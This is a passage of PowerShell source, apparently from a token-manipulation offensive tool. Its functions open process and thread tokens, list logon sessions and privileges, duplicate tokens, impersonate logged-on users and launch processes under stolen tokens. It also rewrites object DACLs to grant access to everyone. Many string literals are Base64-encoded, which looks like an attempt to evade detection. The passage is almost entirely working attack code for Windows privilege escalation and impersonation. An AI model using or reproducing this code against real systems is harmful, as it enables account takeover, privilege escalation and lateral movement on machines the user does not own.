            $AclObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ppDacl, [Type]$ACL)
            [UInt32]$RealSize = 2000
            $pAllUsersSid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RealSize)
            $Success = $CreateWellKnownSid.Invoke(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
            if (-not $Success)
            {
                Throw (New-Object ComponentModel.Win32Exception)
            }
            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TRUSTEE)
            $TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
            $TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type]$TRUSTEE)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
            $TrusteeObj.pMultipleTrustee = [IntPtr]::Zero
            $TrusteeObj.MultipleTrusteeOperation = 0
            $TrusteeObj.TrusteeForm = $Win32Constants.TRUSTEE_IS_SID
            $TrusteeObj.TrusteeType = $Win32Constants.TRUSTEE_IS_WELL_KNOWN_GROUP
            $TrusteeObj.ptstrName = $pAllUsersSid
            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EXPLICIT_ACCESS)
            $ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
            $ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type]$EXPLICIT_ACCESS)
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
            $ExplicitAccess.grfAccessPermissions = 0xf03ff
            $ExplicitAccess.grfAccessMode = $Win32constants.GRANT_ACCESS
            $ExplicitAccess.grfInheritance = $Win32Constants.OBJECT_INHERIT_ACE
            $ExplicitAccess.Trustee = $TrusteeObj
            [IntPtr]$NewDacl = [IntPtr]::Zero
            $RetVal = $SetEntriesInAclW.Invoke(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
            if ($RetVal -ne 0)
            {
                Write-Error "Error calling SetEntriesInAclW: $RetVal"
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAllUsersSid)
            if ($NewDacl -eq [IntPtr]::Zero)
            {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABEAEEAQwBMACAAaQBzACAAbgB1AGwAbAA=')))
            }
            $RetVal = $SetSecurityInfo.Invoke($hObject, 0x7, $Win32Constants.DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
            if ($RetVal -ne 0)
            {
                Write-Error "SetSecurityInfo failed. Return value: $RetVal"
            }
            $LocalFree.Invoke($ppSecurityDescriptor) | Out-Null
        }
    }
    function Get-PrimaryToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ProcessId,
            [Parameter()]
            [Switch]
            $FullPrivs
        )
        if ($FullPrivs)
        {
            $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        }
        else
        {
            $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
        }
        $ReturnStruct = New-Object PSObject
        $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
        $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
        if ($hProcess -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Verbose "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((ps -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process."
            return $null
        }
        else
        {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $Success = $OpenProcessToken.Invoke($hProcess, $TokenPrivs, [Ref]$hProcToken)
            if (-not $CloseHandle.Invoke($hProcess))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close process handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hProcess = [IntPtr]::Zero
            if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((ps -Id $ProcessId).Name). Error: $ErrorCode"
                return $null
            }
            else
            {
                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value $hProcToken
            }
        }
        return $ReturnStruct
    }
    function Get-ThreadToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [UInt32]
            $ThreadId
        )
        $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
        $RetStruct = New-Object PSObject
        [IntPtr]$hThreadToken = [IntPtr]::Zero
        $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
        if ($hThread -eq [IntPtr]::Zero)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER) 
            {
                Write-Warning "Failed to open thread handle for ThreadId: $ThreadId. Error code: $ErrorCode"
            }
        }
        else
        {
            $Success = $OpenThreadToken.Invoke($hThread, $TokenPrivs, $false, [Ref]$hThreadToken)
            if (-not $Success)
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if (($ErrorCode -ne $Win32Constants.ERROR_NO_TOKEN) -and  
                 ($ErrorCode -ne $Win32Constants.ERROR_INVALID_PARAMETER)) 
                {
                    Write-Warning "Failed to call OpenThreadToken for ThreadId: $ThreadId. Error code: $ErrorCode"
                }
            }
            else
            {
                if($Instance){
                    Write-Verbose "$Instance : Successfully queried thread token"
                }else{
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABxAHUAZQByAGkAZQBkACAAdABoAHIAZQBhAGQAIAB0AG8AawBlAG4A')))
                }
            }
            if (-not $CloseHandle.Invoke($hThread))
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to close thread handle, this is unexpected. ErrorCode: $ErrorCode"
            }
            $hThread = [IntPtr]::Zero
        }
        $RetStruct | Add-Member -MemberType NoteProperty -Name hThreadToken -Value $hThreadToken
        return $RetStruct
    }
    function Get-TokenInformation
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )
        $ReturnObj = $null
        $TokenStatsSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_STATISTICS)
        [IntPtr]$TokenStatsPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenStatsSize)
        [UInt32]$RealSize = 0
        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenStatistics, $TokenStatsPtr, $TokenStatsSize, [Ref]$RealSize)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "GetTokenInformation failed. Error code: $ErrorCode"
        }
        else
        {
            $TokenStats = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenStatsPtr, [Type]$TOKEN_STATISTICS)
            $LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID))
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenStats.AuthenticationId, $LuidPtr, $false)
            [IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
            $ReturnVal = $LsaGetLogonSessionData.Invoke($LuidPtr, [Ref]$LogonSessionDataPtr)
            if ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
            {
                Write-Warning "Call to LsaGetLogonSessionData failed. Error code: $ReturnVal. LogonSessionDataPtr = $LogonSessionDataPtr"
            }
            else
            {
                $LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type]$SECURITY_LOGON_SESSION_DATA)
                if ($LogonSessionData.Username.Buffer -ne [IntPtr]::Zero -and 
                    $LogonSessionData.LoginDomain.Buffer -ne [IntPtr]::Zero)
                {
                    $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.Username.Buffer, $LogonSessionData.Username.Length/2)
                    $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($LogonSessionData.LoginDomain.Buffer, $LogonSessionData.LoginDomain.Length/2)
                    if ($Username -ieq "$($env:COMPUTERNAME)`$")
                    {
                        [UInt32]$Size = 100
                        [UInt32]$NumUsernameChar = $Size / 2
                        [UInt32]$NumDomainChar = $Size / 2
                        [UInt32]$SidNameUse = 0
                        $UsernameBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $DomainBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Size)
                        $Success = $LookupAccountSidW.Invoke([IntPtr]::Zero, $LogonSessionData.Sid, $UsernameBuffer, [Ref]$NumUsernameChar, $DomainBuffer, [Ref]$NumDomainChar, [Ref]$SidNameUse)
                        if ($Success)
                        {
                            $Username = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($UsernameBuffer)
                            $Domain = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($DomainBuffer)
                        }
                        else
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "Error calling LookupAccountSidW. Error code: $ErrorCode"
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UsernameBuffer)
                        $UsernameBuffer = [IntPtr]::Zero
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($DomainBuffer)
                        $DomainBuffer = [IntPtr]::Zero
                    }
                    $ReturnObj = New-Object PSObject
                    $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
                    $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
                    $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
                    $ReturnObj | Add-Member -Type NoteProperty -Name LogonType -Value $LogonSessionData.LogonType
                    $ReturnObj | Add-Member -Type NoteProperty -Name IsElevated -Value $false
                    $TokenElevationSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_ELEVATION)
                    $TokenElevationPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenElevationSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenElevation, $TokenElevationPtr, $TokenElevationSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenElevation status. ErrorCode: $ErrorCode" 
                    }
                    else
                    {
                        $TokenElevation = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenelevationPtr, [Type]$TOKEN_ELEVATION)
                        if ($TokenElevation.TokenIsElevated -ne 0)
                        {
                            $ReturnObj.IsElevated = $true
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenElevationPtr)
                    $ReturnObj | Add-Member -Type NoteProperty -Name TokenType -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAVABvAFIAZQB0AHIAaQBlAHYAZQA=')))
                    [UInt32]$TokenTypeSize = 4
                    [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypeSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenType, $TokenTypePtr, $TokenTypeSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenType = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenTypePtr, [Type][UInt32])
                        switch($TokenType)
                        {
                            1 {$ReturnObj.TokenType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbQBhAHIAeQA=')))}
                            2 {$ReturnObj.TokenType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA=')))}
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)
                    if ($ReturnObj.TokenType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))))
                    {
                        $ReturnObj | Add-Member -Type NoteProperty -Name ImpersonationLevel -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAVABvAFIAZQB0AHIAaQBlAHYAZQA=')))
                        [UInt32]$ImpersonationLevelSize = 4
                        [IntPtr]$ImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ImpersonationLevelSize) 
                        [UInt32]$RealSize = 0
                        $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenImpersonationLevel, $ImpersonationLevelPtr, $ImpersonationLevelSize, [Ref]$RealSize)
                        if (-not $Success)
                        {
                            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                            Write-Warning "GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: $ErrorCode"
                        }
                        else
                        {
                            [UInt32]$ImpersonationLevel = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImpersonationLevelPtr, [Type][UInt32])
                            switch ($ImpersonationLevel)
                            {
                                0 { $ReturnObj.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEEAbgBvAG4AeQBtAG8AdQBzAA=='))) }
                                1 { $ReturnObj.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAZABlAG4AdABpAGYAaQBjAGEAdABpAG8AbgA='))) }
                                2 { $ReturnObj.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4A'))) }
                                3 { $ReturnObj.ImpersonationLevel = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEQAZQBsAGUAZwBhAHQAaQBvAG4A'))) }
                            }
                        }
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ImpersonationLevelPtr)
                    }
                    $ReturnObj | Add-Member -Type NoteProperty -Name SessionID -Value $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA=')))
                    [UInt32]$TokenSessionIdSize = 4
                    [IntPtr]$TokenSessionIdPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenSessionIdSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenSessionId, $TokenSessionIdPtr, $TokenSessionIdSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        [UInt32]$TokenSessionId = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenSessionIdPtr, [Type][UInt32])
                        $ReturnObj.SessionID = $TokenSessionId
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenSessionIdPtr)
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesEnabled -Value @()
                    $ReturnObj | Add-Member -Type NoteProperty -Name PrivilegesAvailable -Value @()
                    [UInt32]$TokenPrivilegesSize = 1000
                    [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesSize)
                    [UInt32]$RealSize = 0
                    $Success = $GetTokenInformation.Invoke($hToken, $TOKEN_INFORMATION_CLASS::TokenPrivileges, $TokenPrivilegesPtr, $TokenPrivilegesSize, [Ref]$RealSize)
                    if (-not $Success)
                    {
                        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        Write-Warning "GetTokenInformation failed to retrieve Token SessionId. ErrorCode: $ErrorCode"
                    }
                    else
                    {
                        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
                        [IntPtr]$PrivilegesBasePtr = [IntPtr](Add-SignedIntAsUnsigned $TokenPrivilegesPtr ([System.Runtime.InteropServices.Marshal]::OffsetOf([Type]$TOKEN_PRIVILEGES, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))))))
                        $LuidAndAttributeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
                        for ($i = 0; $i -lt $TokenPrivileges.PrivilegeCount; $i++)
                        {
                            $LuidAndAttributePtr = [IntPtr](Add-SignedIntAsUnsigned $PrivilegesBasePtr ($LuidAndAttributeSize * $i))
                            $LuidAndAttribute = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributePtr, [Type]$LUID_AND_ATTRIBUTES)
                            [UInt32]$PrivilegeNameSize = 60
                            $PrivilegeNamePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PrivilegeNameSize)
                            $PLuid = $LuidAndAttributePtr 
                            $Success = $LookupPrivilegeNameW.Invoke([IntPtr]::Zero, $PLuid, $PrivilegeNamePtr, [Ref]$PrivilegeNameSize)
                            if (-not $Success)
                            {
                                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                                Write-Warning "Call to LookupPrivilegeNameW failed. Error code: $ErrorCode. RealSize: $PrivilegeNameSize"
                            }
                            $PrivilegeName = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($PrivilegeNamePtr)
                            $PrivilegeStatus = ""
                            $Enabled = $false
                            if ($LuidAndAttribute.Attributes -eq 0)
                            {
                                $Enabled = $false
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) -eq $Win32Constants.SE_PRIVILEGE_ENABLED_BY_DEFAULT) 
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_ENABLED) -eq $Win32Constants.SE_PRIVILEGE_ENABLED) 
                            {
                                $Enabled = $true
                            }
                            if (($LuidAndAttribute.Attributes -band $Win32Constants.SE_PRIVILEGE_REMOVED) -eq $Win32Constants.SE_PRIVILEGE_REMOVED) 
                            {
                                Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGUAeABwAGUAYwB0AGUAZAAgAGIAZQBoAGEAdgBpAG8AcgA6ACAARgBvAHUAbgBkACAAYQAgAHQAbwBrAGUAbgAgAHcAaQB0AGgAIABTAEUAXwBQAFIASQBWAEkATABFAEcARQBfAFIARQBNAE8AVgBFAEQALgAgAFAAbABlAGEAcwBlACAAcgBlAHAAbwByAHQAIAB0AGgAaQBzACAAYQBzACAAYQAgAGIAdQBnAC4AIAA=')))
                            }
                            if ($Enabled)
                            {
                                $ReturnObj.PrivilegesEnabled += ,$PrivilegeName
                            }
                            else
                            {
                                $ReturnObj.PrivilegesAvailable += ,$PrivilegeName
                            }
                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($PrivilegeNamePtr)
                        }
                    }
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
                }
                else
                {
                    Write-Verbose "Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data. $($LogonSessionData.UserName.Length)"
                }
                $ntstatus = $LsaFreeReturnBuffer.Invoke($LogonSessionDataPtr)
                $LogonSessionDataPtr = [IntPtr]::Zero
                if ($ntstatus -ne 0)
                {
                    Write-Warning "Call to LsaFreeReturnBuffer failed. Error code: $ntstatus"
                }
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)
            $LuidPtr = [IntPtr]::Zero
        }
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenStatsPtr)
        $TokenStatsPtr = [IntPtr]::Zero
        return $ReturnObj
    }
    function Get-UniqueTokens
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [Object[]]
            $AllTokens
        )
        $TokenByUser = @{}
        $TokenByEnabledPriv = @{}
        $TokenByAvailablePriv = @{}
        foreach ($Token in $AllTokens)
        {
            $Key = $Token.Domain + "\" + $Token.Username
            if (-not $TokenByUser.ContainsKey($Key))
            {
                if ($Token.LogonType -ne 3 -and
                    $Token.Username -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBEAFcATQAtAFwAZAArACQA'))) -and
                    $Token.Username -inotmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAE8AQwBBAEwAXABzAFMARQBSAFYASQBDAEUAJAA='))))
                {
                    $TokenByUser.Add($Key, $Token)
                }
            }
            else
            {
                if($Token.IsElevated -eq $TokenByUser[$Key].IsElevated)
                {
                    if (($Token.PrivilegesEnabled.Count + $Token.PrivilegesAvailable.Count) -gt ($TokenByUser[$Key].PrivilegesEnabled.Count + $TokenByUser[$Key].PrivilegesAvailable.Count))
                    {
                        $TokenByUser[$Key] = $Token
                    }
                }
                elseif (($Token.IsElevated -eq $true) -and ($TokenByUser[$Key].IsElevated -eq $false))
                {
                    $TokenByUser[$Key] = $Token
                }
            }
        }
        foreach ($Token in $AllTokens)
        {
            $Fullname = "$($Token.Domain)\$($Token.Username)"
            foreach ($Privilege in $Token.PrivilegesEnabled)
            {
                if ($TokenByEnabledPriv.ContainsKey($Privilege))
                {
                    if($TokenByEnabledPriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByEnabledPriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByEnabledPriv.Add($Privilege, @($Fullname))
                }
            }
            foreach ($Privilege in $Token.PrivilegesAvailable)
            {
                if ($TokenByAvailablePriv.ContainsKey($Privilege))
                {
                    if($TokenByAvailablePriv[$Privilege] -notcontains $Fullname)
                    {
                        $TokenByAvailablePriv[$Privilege] += ,$Fullname
                    }
                }
                else
                {
                    $TokenByAvailablePriv.Add($Privilege, @($Fullname))
                }
            }
        }
        $ReturnDict = @{
            TokenByUser = $TokenByUser
            TokenByEnabledPriv = $TokenByEnabledPriv
            TokenByAvailablePriv = $TokenByAvailablePriv
        }
        return (New-Object PSObject -Property $ReturnDict)
    }
    function Invoke-ImpersonateUser
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken
        )
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) 
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
            if (-not $Success)
            {
                $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"
            }
        }
        $Success = $CloseHandle.Invoke($NewHToken)
        $NewHToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "CloseHandle failed to close NewHToken. ErrorCode: $ErrorCode"
        }
        return $Success
    }
    function Create-ProcessWithToken
    {
        Param(
            [Parameter(Position=0, Mandatory=$true)]
            [IntPtr]
            $hToken,
            [Parameter(Position=1, Mandatory=$true)]
            [String]
            $ProcessName,
            [Parameter(Position=2)]
            [String]
            $ProcessArgs,
            [Parameter(Position=3)]
            [Switch]
            $PassThru
        )
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAGkAbgBnACAAQwByAGUAYQB0AGUALQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAA==')))
        [IntPtr]$NewHToken = [IntPtr]::Zero
        $Success = $DuplicateTokenEx.Invoke($hToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken)
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Warning "DuplicateTokenEx failed. ErrorCode: $ErrorCode"
        }
        else
        {
            $StartupInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$STARTUPINFO)
            [IntPtr]$StartupInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInfoSize)
            $memset.Invoke($StartupInfoPtr, 0, $StartupInfoSize) | Out-Null
            [System.Runtime.InteropServices.Marshal]::WriteInt32($StartupInfoPtr, $StartupInfoSize) 
            $ProcessInfoSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PROCESS_INFORMATION)
            [IntPtr]$ProcessInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInfoSize)
            $ProcessNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("$ProcessName")
            $ProcessArgsPtr = [IntPtr]::Zero
            if (-not [String]::IsNullOrEmpty($ProcessArgs))
            {
                $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$ProcessName`" $ProcessArgs")
            }
            $FunctionName = ""
            if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwAgAGkAbgAgAFMAZQBzAHMAaQBvAG4AIAAwAC4AIABFAG4AYQBiAGwAaQBuAGcAIABTAGUAQQBzAHMAaQBnAG4AUAByAGkAbQBhAHIAeQBUAG8AawBlAG4AUAByAGkAdgBpAGwAZQBnAGUAIABhAG4AZAAgAGMAYQBsAGwAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAEEAcwBVAHMAZQByAFcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzACAAdwBpAHQAaAAgAGEAbAB0AGUAcgBuAGEAdABlACAAdABvAGsAZQBuAC4A')))
                Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
                $Success = $CreateProcessAsUserW.Invoke($NewHToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBBAHMAVQBzAGUAcgBXAA==')))
            }
            else
            {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAIAByAHUAbgBuAGkAbgBnACAAaQBuACAAUwBlAHMAcwBpAG8AbgAgADAALAAgAGMAYQBsAGwAaQBuAGcAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgAVABvAGsAZQBuAFcAIAB0AG8AIABjAHIAZQBhAHQAZQAgAGEAIABwAHIAbwBjAGUAcwBzACAAdwBpAHQAaAAgAGEAbAB0AGUAcgBuAGEAdABlACAAdABvAGsAZQBuAC4A')))
                $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x0, $ProcessNamePtr, $ProcessArgsPtr, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                $FunctionName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBXAGkAdABoAFQAbwBrAGUAbgBXAA==')))
            }
            if ($Success)
            {
                $ProcessInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ProcessInfoPtr, [Type]$PROCESS_INFORMATION)
                $CloseHandle.Invoke($ProcessInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($ProcessInfo.hThread) | Out-Null
		if ($PassThru) {
			$returnProcess = ps -Id $ProcessInfo.dwProcessId
			$null = $returnProcess.Handle
			$returnProcess
		}
            }
            else
            {
                $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Warning "$FunctionName failed. Error code: $ErrorCode"
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($StartupInfoPtr)
            $StartupInfoPtr = [Intptr]::Zero
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcessInfoPtr)
            $ProcessInfoPtr = [IntPtr]::Zero
            [System.Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($ProcessNamePtr)
            $ProcessNamePtr = [IntPtr]::Zero
            $Success = $CloseHandle.Invoke($NewHToken)
